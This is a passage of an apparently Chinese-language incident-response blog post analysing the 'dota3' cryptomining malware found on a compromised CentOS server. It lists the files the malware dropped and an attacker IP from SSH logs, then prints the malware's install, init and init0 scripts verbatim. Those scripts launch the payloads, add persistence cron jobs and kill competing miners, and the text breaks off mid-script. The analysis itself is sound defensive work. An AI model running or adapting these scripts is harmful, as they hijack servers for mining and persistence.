class="line"></span><br><span class="line">search_user_file <span class="variable">$search_path</span> <span class="variable">$user</span> <span class="variable">$target_path</span></span><br></pre></td></tr></table></figure>
脚本目录下执行`./searchfile.sh /`，跑了十几分钟
**得到木马创建的所有文件如下**
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">------- Wed May 19 15:03:39 CST 2021 ------</span><br><span class="line">/home/cj/.bash_history</span><br><span class="line">/home/cj/.bash_logout</span><br><span class="line">/home/cj/.bash_profile</span><br><span class="line">/home/cj/.bashrc</span><br><span class="line">/home/cj/.cache/abrt/lastnotification</span><br><span class="line">/home/cj/.configrc/a/a</span><br><span class="line">/home/cj/.configrc/a/bash.pid</span><br><span class="line">/home/cj/.configrc/a/dir.dir</span><br><span class="line">/home/cj/.configrc/a/init0</span><br><span class="line">/home/cj/.configrc/a/kswapd0</span><br><span class="line">/home/cj/.configrc/a/.procs</span><br><span class="line">/home/cj/.configrc/a/run</span><br><span class="line">/home/cj/.configrc/a/stop</span><br><span class="line">/home/cj/.configrc/a/upd</span><br><span class="line">/home/cj/.configrc/b/a</span><br><span class="line">/home/cj/.configrc/b/dir.dir</span><br><span class="line">/home/cj/.configrc/b/run</span><br><span class="line">/home/cj/.configrc/b/stop</span><br><span class="line">/home/cj/.configrc/b/sync</span><br><span class="line">/home/cj/.configrc/dir2.dir</span><br><span class="line">/home/cj/.ssh/authorized_keys</span><br><span class="line">/home/cj/.viminfo</span><br><span class="line">/tmp/.X25-unix/dota3.tar.gz</span><br><span class="line">/tmp/.X25-unix/.rsync/1</span><br><span class="line">/tmp/.X25-unix/.rsync/a/a</span><br><span class="line">/tmp/.X25-unix/.rsync/a/init0</span><br><span class="line">/tmp/.X25-unix/.rsync/a/kswapd0</span><br><span class="line">/tmp/.X25-unix/.rsync/a/run</span><br><span class="line">/tmp/.X25-unix/.rsync/a/stop</span><br><span class="line">/tmp/.X25-unix/.rsync/b/a</span><br><span class="line">/tmp/.X25-unix/.rsync/b/run</span><br><span class="line">/tmp/.X25-unix/.rsync/b/stop</span><br><span class="line">/tmp/.X25-unix/.rsync/c/1</span><br><span class="line">/tmp/.X25-unix/.rsync/c/a</span><br><span class="line">/tmp/.X25-unix/.rsync/c/aptitude</span><br><span class="line">/tmp/.X25-unix/.rsync/c/dir.dir</span><br><span class="line">/tmp/.X25-unix/.rsync/c/go</span><br><span class="line">/tmp/.X25-unix/.rsync/c/golan</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libc.so.6</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libdl.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libnss_dns.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libnss_files.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libpthread.so.0</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libresolv-2.23.so</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/libresolv.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/32/tsm</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libc.so.6</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libdl.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libnss_dns.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libnss_files.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libpthread.so.0</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libresolv-2.23.so</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/libresolv.so.2</span><br><span class="line">/tmp/.X25-unix/.rsync/c/lib/64/tsm</span><br><span class="line">/tmp/.X25-unix/.rsync/c/n</span><br><span class="line">/tmp/.X25-unix/.rsync/c/run</span><br><span class="line">/tmp/.X25-unix/.rsync/c/scan.log</span><br><span class="line">/tmp/.X25-unix/.rsync/c/slow</span><br><span class="line">/tmp/.X25-unix/.rsync/c/start</span><br><span class="line">/tmp/.X25-unix/.rsync/c/stop</span><br><span class="line">/tmp/.X25-unix/.rsync/c/tsm</span><br><span class="line">/tmp/.X25-unix/.rsync/c/tsm32</span><br><span class="line">/tmp/.X25-unix/.rsync/c/tsm64</span><br><span class="line">/tmp/.X25-unix/.rsync/c/v</span><br><span class="line">/tmp/.X25-unix/.rsync/c/watchdog</span><br><span class="line">/tmp/.X25-unix/.rsync/dir.dir</span><br><span class="line">/tmp/.X25-unix/.rsync/init</span><br><span class="line">/tmp/.X25-unix/.rsync/init2</span><br><span class="line">/tmp/.X25-unix/.rsync/initall</span><br><span class="line">/tmp/.X25-unix/.rsync/.out</span><br><span class="line">/tmp/up.txt</span><br><span class="line">/var/spool/cron/cj</span><br><span class="line">/var/spool/mail/cj</span><br><span class="line">/var/tmp/.systemcache436621</span><br></pre></td></tr></table></figure>
>a目录下存放shellbot后门，b目录下存放挖矿木马，c目录下存放SSH爆破攻击程序。


<br>
#### 查看历史命令和登陆
**执行`history`查看历史命令**
发现所有的历史命令都没有了，可能是脚本已经自动清除了。

<p><strong>执行<code>last</code>查看近期登录的帐户记录</strong><br>发现没有cj登陆记录，应该也被清除了。</p>
<p><strong>执行<code>/var/log/secure|grep &#39;Accepted&#39;</code>查看成功登录的ip</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-13-centos tmp]# less /var/log/secure|grep &#x27;Accepted&#x27;</span><br><span class="line">May 18 13:57:27 VM-0-13-centos sshd[24567]: Accepted password for cj from 42.192.205.184 port 33090 ssh2</span><br></pre></td></tr></table></figure>
<p>发现了<code>42.192.205.184</code>这个IP在下午<code>13:57:27</code>成功登录了这个云，这个时间和up.txt文件创建的时间相同。那就是这个IP破解了我的密码，IP地址在上海。可能也是被木马黑掉的服务器吧。</p>
<blockquote>
<p>国外的服务器延迟高，但是带宽大，国内的带宽小，但是延迟低。传输需要大带宽，破解需要小延迟，所以想想这么配置很合理。</p>
</blockquote>
<br>
# 六、脚本执行顺序
## 6.1 /home/cj/.configrc/a/下的脚本

<p><strong>Install</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">rm -rf /tmp/.FILE</span><br><span class="line">rm -rf /tmp/.FILE*</span><br><span class="line">rm -rf /dev/shm/.FILE*</span><br><span class="line">rm -rf /dev/shm/.FILE</span><br><span class="line">rm -rf /var/tmp/.FILE</span><br><span class="line">rm -rf /var/tmp/.FILE*</span><br><span class="line">rm -rf /tmp/nu.sh</span><br><span class="line">rm -rf /tmp/nu.*</span><br><span class="line">rm -rf /dev/shm/nu.sh</span><br><span class="line">rm -rf /dev/shm/nu.*</span><br><span class="line">rm -rf /tmp/.F*</span><br><span class="line">rm -rf /tmp/.x*</span><br><span class="line">rm -rf /tmp/tdd.sh</span><br><span class="line"></span><br><span class="line">pkill -9 go&gt; .out</span><br><span class="line">pkill -9 run&gt; .out</span><br><span class="line">pkill -9 tsm&gt; .out</span><br><span class="line">kill -9 `ps x|grep run|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line">kill -9 `ps x|grep go|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line">kill -9 `ps x|grep tsm|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line"></span><br><span class="line">killall -9 xmrig</span><br><span class="line">killall -9 ld-linux</span><br><span class="line">kill -9 `ps x|grep xmrig|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">kill -9 `ps x|grep ld-linux|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="line">cat init | bash</span><br><span class="line"></span><br><span class="line">sleep 10</span><br><span class="line">cd ~</span><br><span class="line">pwd &gt; dir.dir</span><br><span class="line">dir=$(cat dir.dir)</span><br><span class="line">if [ -d &quot;$dir/.bashtemprc2&quot; ]; then</span><br><span class="line">	exit 0</span><br><span class="line">else</span><br><span class="line">	cat init2 | bash</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>执行dota&#x2F;.rsync&#x2F;initall，Install做一些清理准备工作后，执行init功能。</p>
</blockquote>
<p><strong>Init</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pkill -9 go&gt; .out</span><br><span class="line">pkill -9 run&gt; .out</span><br><span class="line">pkill -9 tsm&gt; .out</span><br><span class="line">kill -9 `ps x|grep run|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line">kill -9 `ps x|grep go|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line">kill -9 `ps x|grep tsm|grep -v grep|awk &#x27;&#123;print $1&#125;&#x27;`&gt; .out</span><br><span class="line"></span><br><span class="line">pwd &gt; dir.dir</span><br><span class="line">dir=$(cat dir.dir)</span><br><span class="line">cd $dir</span><br><span class="line">chmod 777 *</span><br><span class="line"></span><br><span class="line">rm -rf cron.d</span><br><span class="line">rm -rf ~/.nullcach*</span><br><span class="line">rm -rf ~/.firefoxcatch*</span><br><span class="line">rm -rf ~/.bashtem*</span><br><span class="line">rm -rf ~/.configrc*</span><br><span class="line">mkdir ~/.configrc</span><br><span class="line">cp -r a ~/.configrc/</span><br><span class="line">cp -r b ~/.configrc/</span><br><span class="line"></span><br><span class="line">cd ~/.configrc/a/</span><br><span class="line">nohup ./init0 &gt;&gt; /dev/null &amp;</span><br><span class="line">sleep 5s</span><br><span class="line">nohup ./a &gt;&gt;/dev/null &amp;</span><br><span class="line">cd ~/.configrc/b/</span><br><span class="line">nohup ./a &gt;&gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line">cd $dir</span><br><span class="line">cd c</span><br><span class="line">nohup ./start &gt;&gt;/dev/null &amp;</span><br><span class="line">cd ~/.configrc/</span><br><span class="line">pwd &gt; dir2.dir</span><br><span class="line">dir2=$(cat dir2.dir)</span><br><span class="line"></span><br><span class="line">echo &quot;1 1 */2 * * $dir2/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot $dir2/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 $dir2/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot $dir2/b/sync&gt;/dev/null 2&gt;&amp;1  </span><br><span class="line">0 0 */3 * * $dir/c/aptitude&gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; cron.d</span><br><span class="line"></span><br><span class="line">sleep 3s</span><br><span class="line"></span><br><span class="line">rm -rf ~/ps</span><br><span class="line">rm -rf ~/ps.*</span><br><span class="line"></span><br><span class="line">crontab cron.d</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Init中清理自身挖矿进程，写入定时任务</p>
</blockquote>
<br>
接着执行dota/.rsync/a/a，a脚本执行init0，就如注释所言，杀死加密矿工的脚本，结束竞品的shell程序，挖矿程序启动后会结束大部分挖矿软件的进程,并删除其他挖矿软件相关文件，独占资源。
**init0**
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">##########################################################################################\</span><br><span class="line">### A script for killing cryptocurrecncy miners in a Linux enviornment</span><br><span class="line">### Provided with zero liability (!)</span><br><span class="line">###</span><br><span class="line">### Some of the malware used as sources for this tool:</span><br><span class="line">### https://pastebin.com/pxc1sXYZ</span><br><span class="line">### https://pastebin.com/jRerGP1u</span><br><span class="line">### SHA256: 2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4</span><br><span class="line">##########################################################################################\</span><br><span class="line"></span><br><span class="line"># Killing processes by name, path, arguments and CPU utilization</span><br><span class="line">processes()&#123;</span><br><span class="line">	killme() &#123;</span><br><span class="line">	  killall -9 chron-34e2fg;ps wx|awk &#x27;/34e|r\/v3|moy5|defunct/&#x27; | awk &#x27;&#123;print $1&#125;&#x27; | xargs kill -9 &amp; &gt; /dev/null &amp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	killa() &#123;</span><br><span class="line">	what=$1;ps auxw|awk &quot;/$what/&quot; |awk &#x27;!/awk/&#x27; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9&amp;&gt;/dev/null&amp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	killa 34e2fg</span><br><span class="line">	killme</span><br><span class="line">	</span><br><span class="line">	# Killing big CPU</span><br><span class="line">	VAR=$(ps uwx|awk &#x27;&#123;print $2&quot;:&quot;$3&#125;&#x27;| grep -v CPU)</span><br><span class="line">	for word in $VAR</span><br><span class="line">	do</span><br><span class="line">	  CPUUSAGE=$(echo $word|awk -F&quot;:&quot; &#x27;&#123;print $2&#125;&#x27;|awk -F&quot;.&quot; &#x27;&#123; print $1&#125;&#x27;)</span><br><span class="line">	  if [ $CPUUSAGE -gt 45 ]; then echo BIG $word; PID=$(echo $word | awk -F&quot;:&quot; &#x27;&#123;print $1&#x27;&#125;);LINE=$(ps uwx | grep $PID);COUNT=$(echo $LINE| grep -P &quot;er/v5|34e2|Xtmp|wf32N4|moy5Me|ssh&quot;|wc -l);if [ $COUNT -eq 0 ]; then echo KILLING $line; fi;kill $PID;fi;</span><br><span class="line">	done</span><br><span class="line"></span><br><span class="line">	killall \.Historys</span><br><span class="line">	killall \.sshd</span><br><span class="line">	killall neptune</span><br><span class="line">	killall xm64</span><br><span class="line">	killall xm32</span><br><span class="line">	killall ld-linux</span><br><span class="line">	killall xmrig</span><br><span class="line">	killall \.xmrig</span><br><span class="line">	killall suppoieup</span><br><span class="line"></span><br><span class="line">	pkill -f sourplum</span><br><span class="line">	pkill wnTKYg &amp;&amp; pkill ddg* &amp;&amp; rm -rf /tmp/ddg* &amp;&amp; rm -rf /tmp/wnTKYg</span><br><span class="line">	</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;mine.moneropool.com&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmr.crypto-pool.fr:8080&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmr.crypto-pool.fr:8080&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;119.9.76.107:443&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;monerohash.com&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;/tmp/a7b104c270&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmr.crypto-pool.fr:6666&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmr.crypto-pool.fr:7777&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmr.crypto-pool.fr:443&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;stratum.f2pool.com:8888&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmrpool.eu&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmrig&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmrigDaemon&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;xmrigMiner&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;/var/tmp/java&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;ddgs&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;qW3xT&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;t00ls.ru&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;/var/tmp/sustes&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep -v grep|grep &quot;ld-linux&quot; | awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line"></span><br><span class="line">	ps auxf|grep xiaoyao| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep Donald| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep Macron| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep ld-linux| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line"></span><br><span class="line">	ps auxf|grep named| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep kernelcfg| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep xiaoxue| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep kernelupgrade| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep kernelorg| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">	ps auxf|grep kernelupdates| awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line"></span><br><span class="line">	ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep &quot;\-c&quot;|xargs kill -9</span><br><span class="line">	ps ax|grep -o &#x27;./[0-9]* -c&#x27;| xargs pkill -f</span><br><span class="line"></span><br><span class="line">	pkill -f /usr/bin/.sshd</span><br><span class="line">	pkill -f acpid</span><br><span class="line">	pkill -f Donald</span><br><span class="line">	pkill -f Macron</span><br><span class="line">	pkill -f AnXqV.yam</span><br><span class="line">	pkill -f apaceha</span><br><span class="line">	pkill -f askdljlqw</span><br><span class="line">	pkill -f bashe</span><br><span class="line">	pkill -f bashf</span><br><span class="line">	pkill -f bashg</span><br><span class="line">	pkill -f bashh</span><br><span class="line">	pkill -f bashx</span><br><span class="line">	pkill -f BI5zj</span><br><span class="line">	pkill -f biosetjenkins</span><br><span class="line">	pkill -f bonn.sh</span><br><span class="line">	pkill -f bonns</span><br><span class="line">	pkill -f conn.sh</span><br><span class="line">	pkill -f conns</span><br><span class="line">	pkill -f cryptonight</span><br><span class="line">	pkill -f crypto-pool</span><br><span class="line">	pkill -f ddg.2011</span><br><span class="line">	pkill -f deamon</span><br><span class="line">	pkill -f disk_genius</span><br><span class="line">	pkill -f donns</span><br><span class="line">	pkill -f Duck.sh</span><br><span class="line">	pkill -f gddr</span><br><span class="line">	pkill -f Guard.sh</span><br><span class="line">	pkill -f i586</span><br><span class="line">	pkill -f icb5o</span><br><span class="line">	pkill -f ir29xc1</span><br><span class="line">	pkill -f irqba2anc1</span><br><span class="line">	pkill -f irqba5xnc1</span><br><span class="line">	pkill -f irqbalanc1</span><br><span class="line">	pkill -f irqbalance</span><br><span class="line">	pkill 